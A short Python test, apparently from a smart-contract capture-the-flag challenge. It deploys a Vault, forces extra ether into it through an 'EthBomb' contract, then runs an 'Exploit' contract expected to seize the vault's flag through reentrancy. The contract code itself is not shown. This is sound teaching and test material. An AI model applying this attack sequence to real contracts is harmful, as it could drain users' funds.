def test_vault_reentrancy(accounts, Vault, Exploit, EthBomb):
    vault_deployer = accounts[0]
    attacker = accounts[1]

    vault = Vault.deploy({'from':vault_deployer, 'value':'1 ether'})

    bomb = EthBomb.deploy({'from': attacker})
    bomb.force_eth_to_contract(vault, {'from': attacker, 'value': '1 ether'})

    assert vault.balance() == "2 ether"

    exploit = Exploit.deploy({'from': attacker})
    exploit.attack(vault, {'from': attacker})

    assert vault.flagHolder() == attacker